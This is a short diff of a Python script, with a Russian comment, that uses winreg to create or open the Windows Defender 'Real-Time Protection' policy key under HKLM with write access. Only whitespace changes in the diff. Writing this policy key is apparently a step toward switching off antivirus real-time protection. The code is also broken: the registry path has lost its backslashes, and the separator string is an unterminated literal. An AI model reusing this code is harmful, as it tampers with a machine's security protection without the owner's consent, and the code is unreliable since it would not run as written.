@@ -1,10 +1,10 @@
 import winreg
 
-def create_registry_keys():
+def create_registry_keys(): 
     base_path = r"SOFTWAREPoliciesMicrosoftWindows Defender"
     sub_key = r"Real-Time Protection"
     full_path = base_path + "\" + sub_key
-    
+
     try:
         # Открываем или создаём ключ Real-Time Protection в HKLM
         key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, full_path, 0, winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
